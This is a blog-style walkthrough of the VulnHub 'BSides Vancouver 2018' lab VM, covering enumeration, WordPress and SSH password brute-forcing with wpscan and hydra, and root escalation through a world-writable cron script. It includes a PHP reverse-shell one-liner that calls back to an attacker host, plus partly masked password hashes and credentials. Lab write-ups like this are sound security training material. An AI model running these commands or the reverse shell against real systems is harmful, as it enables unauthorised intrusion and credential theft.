@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <title>Mannthan</title>
+    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
+
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
+          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
+          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
+          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[VulnHub] BSides Vancouver: 2018 (Workshop)</h1>
+                  <p><a href="/posts/20190905_vulnhub-billymadison1dot1.html"> « </a>📅 published on <code>09/Sep/2019</code><a href="/posts/20190910_vulnhub-dc6.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">BSides Vancouver: 2018 (Workshop)</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/killchain.png" /></p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Mon Sep  9 18:30:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/bsidesvancouver2018workshop/results/192.168.92.169/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/bsidesvancouver2018workshop/results/192.168.92.169/scans/xml/_quick_tcp_nmap.xml 192.168.92.169
+Nmap scan report for 192.168.92.169
+Host is up, received arp-response (0.00040s latency).
+Scanned at 2019-09-09 18:30:03 PDT for 8s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.92.163
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 2.3.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAMkzaYX4CU4jgFt2LpgYnD4dUrKdvXHU26+oyQDS6DGYj4NK4+BlG6y1Af6NNqGv+Kph7Wp4ZZc3iDnsCXZe62idQOhusQf00LsnusvbuOXmthEicgnDSi4HUMtvs5I9Knt0+YanEq/w6mBVcbv4FoGu/l5xJny0wbiOC4jEtQGdAAAAFQCj+Lv2iCRNBOt/XGRL+YY3bFwTDQAAAIEApOoTiAV/aanDDjLFmAT6UwicLJSXY9ZtJyNUFSTEbZsCu4SSJMh+X66t4eYGhl+Ocs/OrNHmy4pQM5X4EBXmwtiSBDIrcOtiPHsV/QQhTpH60XLRQ+lPn0eoVPN+QS4JXwlb/J8KxSNLhJ6JGwrL1/ubFaywPTULmrSuobSuw+8AAACBAMNS/6H3+124bwcKmMAwwQepW19Awj89dxquE5HqPhrwNs4JYnES7ACYWKJ+/PYv7oxeK5vYrLYBpcQH5ohlJ9Jp0e7Qrinllvj1h3y4VFabKSIB5Vtba06n9+HgJwRROInfIy9D31W8JEYFHhfQbB1sXi9BVYJe646rTwktRCAM
+|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzW3pS4f3ySJqldtlgXJW75MikaSN1qeWtmXgqCi9fVPcUEh+MNxaSdltnr9aUyl7C7b4LoJKDpHuuW8qi+aRukCoaZPC/k4SCgtBjkpbJqq/Ss9Ud8ySoYw3hKHnjnfzg/FDC8a1J4O4akL4a9yaX0BM2xmsi3fm9Epc2HB4MgHvMK9MzgKPz/JaaC47sayw60VlWcgCJo+HyfXmL6iFsUtDodPz/2M2yFbtkX/zleEUb1JXVE2JPCH7VjUkDVMkhch14yCezJfVDvoEq6VeKFwheRb2mcqEuywHRvt79Ovt9JgN6E5mGLMIJvtcWmur7PouFxmuijKwuq8tSPhUX
+|   256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)
+|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIDEfC9c65N5M+6l4b+MJso0upnINHHah2BPkniqSGDi4ITuSkHRkaruC/bVcPkxNWoWoTspMSWNVOtZYumNnI=
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry
+|_/backup_wordpress
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 00:0C:29:D5:5D:EA (VMware)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Sep  9 18:30:11 2019 -- 1 IP address (1 host up) scanned in 8.39 seconds
+</code></pre>
+
+<p>2. The FTP service allows <code>anonymous</code> login. We use it to download a list of users:  </p>
+<pre><code>ftp://192.168.92.169/public/users.txt.bk
+</code></pre>
+
+<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot03.png" />  </p>
+<p>3. We find one disallowed entry within <code>robots.txt</code>:  </p>
+<pre><code>http://192.168.92.169/robots.txt → /backup_wordpress
+</code></pre>
+
+<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot01.png" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports:</h4>
+<pre><code>21/tcp  |  ftp   |  vsftpd 2.3.5
+22/tcp  |  ssh   |  OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+80/tcp  |  http  |  Apache httpd 2.2.22 ((Ubuntu))
+</code></pre>
+
+<h4>Files</h4>
+<pre><code>ftp://192.168.92.169/public/users.txt.bk
+http://192.168.92.169/robots.txt
+</code></pre>
+
+<h4>Users</h4>
+<pre><code>ftp: abatchy, john, mai, anne, doomguy
+wordpress: admin, john
+</code></pre>
+
+<h2>Phase #2: Exploitation</h2>
+<p>1. (method #1) We find a Wordpress installation @ <code>http://192.168.92.169/backup_wordpress</code> and run <code>wpscan</code> to enumerate users:  </p>
+<pre><code>wpscan --url http://192.168.92.167:69/ -e vp,vt,tt,cb,dbe,u,m --no-color → admin, john
+</code></pre>
+
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot02.png" />  </p>
+<p>2. (method #1) We run a Wordpress password bruteforce attempt for user <code>john</code>:  </p>
+<pre><code>wpscan --url http://192.168.92.169/backup_wordpress/ --wordlist /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --username john
+</code></pre>
+
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot04.png" />  </p>
+<p>3. (method #1) While testing, an unknown response is sent for username, password combo of <code>john</code> and <code>enigma</code>:  </p>
+<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot05.png" />  </p>
+<p>4. (method #1) We test these credentials manually and are successfully logged in:  </p>
+<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot06.png" />  </p>
+<p>5. (method #1) We edit the <code>footer.php</code> theme file to gain command execution:  </p>
+<p><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot07.png" />  </p>
+<p>6. (method #1) After successfully testing command execution, we upload a PHP reverse shell by editing the <code>Hello Dolly</code> plugin and gain interactive access:  </p>
+<p><img alt="writeup.exploitation.steps.6.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot08.png" />  </p>
+<p>7. (method #2) We manually test SSH login for all users mentioned within the <code>users.txt.bk</code> file and find that password authentication is enabled only for user <code>anne</code>:  </p>
+<p><img alt="writeup.exploitation.steps.7.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot10.png" />  </p>
+<p>8. (method #2) We bruteforce SSH credentials for user <code>anne</code>:  </p>
+<pre><code>hydra -l anne -P &quot;/usr/share/wordlists/rockyou.txt&quot; -e nsr -s 22 -o &quot;./results/192.168.92.169/scans/tcp_22_ssh_hydra.txt&quot; ssh://192.168.92.169 → anne/princess
+</code></pre>
+
+<p><img alt="writeup.exploitation.steps.8.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot12.png" />  </p>
+<p>9. (method #2) We can ssh as user <code>anne</code> and gain interactive access:  </p>
+<p><img alt="writeup.exploitation.steps.9.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot13.png" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>www-data|anne@bsides2018&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=1003(anne) gid=1003(anne) groups=1003(anne),27(sudo)
+www-data|anne@bsides2018&gt;  
+www-data|anne@bsides2018&gt; uname
+Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+www-data|anne@bsides2018&gt;  
+www-data|anne@bsides2018&gt; ifconfig
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000
+    link/ether 00:0c:29:d5:5d:ea brd ff:ff:ff:ff:ff:ff
+    inet 192.168.92.169/24 brd 192.168.92.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::20c:29ff:fed5:5dea/64 scope link
+       valid_lft forever preferred_lft forever
+www-data|anne@bsides2018&gt;  
+www-data|anne@bsides2018&gt; users
+john
+mai
+anne
+doomguy
+</code></pre>
+
+<h2>Phase #3: Privilege Escalation</h2>
+<p>1. (method #1) Continuing as user <code>www-data</code>, we explore the <code>/var/www/backup_wordpress/</code> directory and find <code>wp-config.php</code> file with MySQL credentials in it:  </p>
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot15.png" />  </p>
+<p>2. (method #1) These credentials do not work for MySQL login. Changing user to <code>john</code> with these credentials also failed.  </p>
+<p>3. (method #1) Exploring <code>/etc/crontab</code> we find an entry for file <code>/usr/local/bin/cleanup</code> that is run every minute. This file is owned by <code>root</code> and has <code>rwx</code> permissions for <code>ugo</code>. We exploit this to edit the file and add an entry to intiate a PHP reverse shell:  </p>
+<pre><code>echo -e &quot;php -r '\$sock=fsockopen(\&quot;192.168.92.163\&quot;,8080);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'&quot; &gt;&gt;/usr/local/bin/cleanup
+</code></pre>
+
+<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot16.png" />  </p>
+<p>4. (method #1) Within a minute, the updated <code>cleanup</code> file is executed as part of cronjob with <code>root</code> permissions and we catch an elevated shell using our netcat listener  </p>
+<p>5. (method #1) We use this shell to view the contents of <code>/root/flag.txt</code> file:  </p>
+<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot17.png" />  </p>
+<p>6. (method #2) Continuing as user <code>anne</code>, we find that this user is part of <code>sudo</code> group and using <code>sudo -l</code> we see that <code>anne</code> can execute all commands as <code>root</code>. We use this fact to gain elevated privileges:  </p>
+<pre><code>sudo su
+</code></pre>
+
+<p><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot14.png" />  </p>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>john:$6$aoN7zaDl$e6RsRZndFekSS4bgqz0y5dgzO1dTQsMAWck6dFGogkxrrZf1ZyGbjy/oCpqJniIkasXP05iFZHs.XZVIQ........................
+mai:$6$Mp.mBBi7$BCAKb75xSAy8PM6IhjdSOIlcmHvA9V4KnEDSTZAN2QdMUwCwGiwZtwGPXalF15xT097Q6zaXrY6nD/7Rsd.......................
+anne:$6$ChsjoKyY$1uHlk7QUSOmdpvSP7Q4PYmE3evwQbUPFp27I4ZdRx/pZp8C8gJAQGu2vy8kwLakYA7cWuZ40aOl2u.8J9........................
+doomguy:$6$DWqgg./v$NxqnujIjE8RI.y1u/xiFBPC0K/essEGOfxSF7ovfHG46K6pnetHZNON3sp19rGuoqo26wQkA4B2znRvhq........................
+</code></pre>
+
+<h3>Credentials</h3>
+<pre><code>mysql: john/thiscannot....
+ssh: anne/princ...
+wordpress: john/eni...
+</code></pre>
+
+<h2>References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/</a>  </li>
+<li><a href="https://pentester.land/challenge/2018/06/27/vulnhub-Bsides-Vancouver-2018-walkthrough.html">https://pentester.land/challenge/2018/06/27/vulnhub-Bsides-Vancouver-2018-walkthrough.html</a>  </li>
+</ul>
+        <hr/>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#oscp>oscp</a>, <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeups>writeups</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190905_vulnhub-billymadison1dot1.html">[VulnHub] Billy Madison: 1.1...</a> « | » <a href="/posts/20190910_vulnhub-dc6.html">[VulnHub] DC: 6...</a> »</p>
+                <hr/>
+    </div>
+    <div class="footer">
+      <p style="text-align:center;">[<a href="https://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">📝 CC BY 4.0</a>]</p>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+  </body>
+</html>
